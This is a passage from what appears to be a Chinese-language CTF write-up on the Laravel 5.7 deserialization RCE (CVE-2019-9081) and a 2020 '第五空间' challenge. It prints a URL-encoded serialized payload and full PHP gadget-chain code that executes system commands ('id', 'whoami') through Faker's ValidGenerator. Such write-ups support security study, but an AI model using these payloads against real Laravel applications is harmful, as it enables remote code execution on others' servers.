<p>EXP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bi%3A1%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A0%3A%7B%7D%7D%7D%7D%7Ds%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A2%3A%22id%22%3B%7D%7D</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2020/06/28/4vfwJAILg7Trt3X.jpg" alt="-w1493"></p>
<h3 id="0x05-CVE-2019-9081的参考链接"><a href="#0x05-CVE-2019-9081的参考链接" class="headerlink" title="0x05 CVE-2019-9081的参考链接"></a>0x05 CVE-2019-9081的参考链接</h3><ol>
<li><a href="https://xz.aliyun.com/t/5483" target="_blank" rel="noopener">Laravel5.7反序列化漏洞之RCE链挖掘</a></li>
<li><a href="https://www.cnblogs.com/tr1ple/p/11079354.html" target="_blank" rel="noopener">代码审计之CVE-2019-9081 Laravel5.7 反序列化 RCE复现分析</a></li>
<li><a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" target="_blank" rel="noopener">laravelv5.7反序列化rce(CVE-2019-9081)</a></li>
</ol>
<h3 id="0x06-第五空间–laravel"><a href="#0x06-第五空间–laravel" class="headerlink" title="0x06 第五空间–laravel"></a>0x06 第五空间–laravel</h3><p>Diff一下的发现其实题目中所做的修改仅仅是删除了<code>vendor/laravel/framework/src/Illuminate/Foundation/Testing/PendingCommand.php</code>文件中的<code>$this-&gt;run();</code>这一行代码。没有这个调用点，那我们的思路就是在其中找一个<code>call_user_func</code>来执行<code>Illuminate/Foundation/Testing/PendingCommand</code>类中的<code>run</code>方法。<br><img src="https://i.loli.net/2020/06/28/BZt24oINVxg36iz.png" alt="-w1050"><br>此处我们使用<code>vendor/fzaninotto/faker/src/Faker/ValidGenerator.php</code>文件中的<code>call_user_func</code>函数来完成对<code>run</code>的调用<br><img src="https://i.loli.net/2020/06/28/PnVRAUZWHGxfi27.png" alt="-w931"><br>这个思路其实并不是新的，PHPGGC当中就经常只用这个点，因为<code>ValidGenerator</code>类中的<code>__call</code>比较好利用，而其中又包含了<code>call_user_func_array</code>、<code>call_user_func</code>。所以结合这个点很容易就构造出下面这个Exp。具体的不在多写，如果有不清楚的可以看后面的参考链接。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Exp来自chamd5 wp</span></span><br><span class="line"><span class="comment">//gadgets.php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters, $class, $app)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $class;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenericUser</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes = $attributes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hasBeenBootstrapped</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> $bindings;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bind)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings = $bind;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CollectionConfigurator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">public</span> $collection;</span><br><span class="line">        <span class="keyword">public</span> $prefixes;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parent)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;prefixes = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;collection = <span class="keyword">new</span> \Symfony\Component\Routing\RouteCollection(<span class="keyword">array</span>(<span class="string">"12end"</span> =&gt; <span class="string">"12end"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ValidGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">generator</span>;</span><br><span class="line">        <span class="keyword">protected</span> $validator;</span><br><span class="line">        <span class="keyword">protected</span> $maxRetries;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($validator)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;generator = <span class="keyword">new</span> \Symfony\Component\Routing\RouteCollection(<span class="keyword">array</span>(<span class="string">"12end"</span> =&gt; <span class="string">"12end"</span>));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;validator = $validator;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;maxRetries = <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">RouteCollection</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//chain.php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"gadgets.php"</span>;</span><br><span class="line"></span><br><span class="line">$payload = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(</span><br><span class="line">    <span class="string">"system"</span>, <span class="keyword">array</span>(<span class="string">'whoami'</span>),</span><br><span class="line">    <span class="keyword">new</span> Illuminate\Auth\GenericUser(<span class="keyword">array</span>(<span class="string">"expectedOutput"</span> =&gt; <span class="keyword">array</span>(<span class="string">"0"</span> =&gt; <span class="string">"1"</span>), <span class="string">"expectedQuestions"</span> =&gt; <span class="keyword">array</span>(<span class="string">"0"</span> =&gt; <span class="string">"1"</span>))),</span><br><span class="line">    <span class="keyword">new</span> Illuminate\Foundation\Application(<span class="keyword">array</span>(<span class="string">"Illuminate\Contracts\Console\Kernel"</span> =&gt; <span class="keyword">array</span>(<span class="string">"concrete"</span> =&gt; <span class="string">"Illuminate\Foundation\Application"</span>)))</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Faker\ValidGenerator(<span class="keyword">array</span>($payload, <span class="string">"run"</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Symfony\Component\Routing\Loader\Configurator\CollectionConfigurator($a)));</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/06/28/RErawMfy9oPpqBS.png" alt="-w1133"></p>
<h3 id="0x07-第五空间laravel题解参考"><a href="#0x07-第五空间laravel题解参考" class="headerlink" title="0x07 第五空间laravel题解参考"></a>0x07 第五空间laravel题解参考</h3><ol>
<li><a href="https://mp.weixin.qq.com/s/TyJsK5Rkg6MXvADS13RIcA" target="_blank" rel="noopener">第五空间-WriteUp</a></li>
<li><a href="https://www.anquanke.com/post/id/170681" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链(一)</a></li>
<li><a href="http://zeroyu.xyz/2020/06/04/Code-breaking-Puzzles-2018-Note/#0x06-lumenserial" target="_blank" rel="noopener">Code-breaking Puzzles 2018 Note–lumenserial</a></li>
</ol>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-判断题目环境的版本"><span class="toc-number">2.</span> <span class="toc-text">0x01 判断题目环境的版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-设置对应的入口点"><span class="toc-number">3.</span> <span class="toc-text">0x02 设置对应的入口点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-本地环境搭建"><span class="toc-number">4.</span> <span class="toc-text">0x03 本地环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#A-本地环境配置"><span class="toc-number">4.1.</span> <span class="toc-text">A.本地环境配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#B-虚拟机环境配置"><span class="toc-number">4.2.</span> <span class="toc-text">B.虚拟机环境配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-CVE-2019-9081"><span class="toc-number">5.</span> <span class="toc-text">0x04 CVE-2019-9081</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-CVE-2019-9081的参考链接"><span class="toc-number">6.</span> <span class="toc-text">0x05 CVE-2019-9081的参考链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-第五空间–laravel"><span class="toc-number">7.</span> <span class="toc-text">0x06 第五空间–laravel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-第五空间laravel题解参考"><span class="toc-number">8.</span> <span class="toc-text">0x07 第五空间laravel题解参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&text=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&title=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&is_video=false&description=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)&body=Check out this article: http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&title=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&title=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&title=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&title=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2020/06/28/Laravel-5-7反序列化漏洞-CVE-2019-9081-2020第五空间题解/&name=Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 z3r0yu
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-129276044-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?8415e69cf54ba93c9ddb2eb597859c7d";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'z3r0yu';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


